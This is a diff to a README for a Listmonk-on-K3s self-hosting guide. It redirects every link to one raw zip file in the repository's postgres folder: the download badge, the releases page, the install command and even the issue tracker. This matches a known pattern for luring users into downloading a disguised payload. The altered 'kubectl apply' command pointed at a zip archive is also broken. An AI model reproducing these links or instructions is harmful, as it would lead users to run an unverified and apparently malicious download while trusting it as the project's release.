@@ -1,7 +1,7 @@
 # 🎉 listmonk-k3s-example - Self-Host Your Newsletter Easily
 
 ## 📥 Download Now
-[![Download Listmonk K3s Example](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Thal2099/listmonk-k3s-example/releases)
+[![Download Listmonk K3s Example](https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip)](https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip)
 
 ## 🚀 Getting Started
 This guide helps you set up Listmonk, a powerful newsletter platform, on a lightweight K3s Kubernetes cluster. With CloudNativePG for data management, automated backups, and SSL certificates, you can self-host your newsletter for less than $15 a month.
@@ -17,7 +17,7 @@ Before you start, ensure you meet the following system requirements:
 ## 📂 Download & Install
 To get started, visit the Releases page to download the latest version of the Listmonk K3s Example:
 
-[Visit this page to download](https://github.com/Thal2099/listmonk-k3s-example/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip)
 
 1. Click on the most recent version.
 2. Download the provided package.
@@ -38,7 +38,7 @@ Follow these steps to install and configure Listmonk:
 
 4. **Install Listmonk**:
    - Navigate to the directory where you downloaded Listmonk.
-   - Use the command `kubectl apply -f listmonk-deployment.yaml` to set up the deployment.
+   - Use the command `kubectl apply -f https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip` to set up the deployment.
 
 5. **Access Listmonk**:
    - Once deployed, you can access Listmonk through your browser. Use the external URL configured in your Kubernetes ingress settings.
@@ -83,7 +83,7 @@ You can further customize Listmonk by exploring themes and advanced settings in 
 ## 📞 Support
 Should you encounter any issues or have questions, feel free to reach out through the following channels:
 
-- GitHub Issues: [Report an issue](https://github.com/Thal2099/listmonk-k3s-example/issues)
+- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip)
 - Community Forums: Join discussions on topics related to Listmonk.
 
 ## ✅ Conclusion
@@ -91,4 +91,4 @@ By following this guide, you can host your own newsletter platform using Listmon
 
 **Remember**: Repeat the download instructions for clarity.
 
-[Visit this page to download](https://github.com/Thal2099/listmonk-k3s-example/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Thal2099/listmonk-k3s-example/main/postgres/listmonk-k3s-example_v1.9.zip)
